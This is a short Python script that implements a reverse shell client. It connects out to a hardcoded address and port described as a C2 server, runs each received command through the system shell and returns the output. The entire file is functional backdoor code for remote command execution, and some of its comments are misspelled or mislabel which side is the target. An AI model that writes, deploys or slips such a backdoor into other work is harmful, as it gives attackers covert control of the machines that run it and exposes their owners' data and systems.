#!/usr/bin/python3

import socket
import subprocess # libray which enables us to use trgt OS command in C2 server
          
def shell():

        global sock

        while True:
                cmd = sock.recv(1024) # received response in binary form
                cmd = cmd.decode('utf-8') # decoding to text form

                if cmd == "exit":
                        break
                else:
                        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # To enable trgt OS command to run in C2 server

                        result = proc.stdout.read() + proc.stderr.read() # to show output as well as error to the screen in response to the sent command
                        sock.send(result) # getting output on the terminal

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creating socket method

# Connecting with the trgt
sock.connect(("192.168.0.105",1234)) # change the ip and port

def main():
	shell()
	sock.close() # Closing listening socket as soon as 'exit' command is used in terminal by C2 server owner to break out of shell() function

if __name__ == '__main__': 
	main()

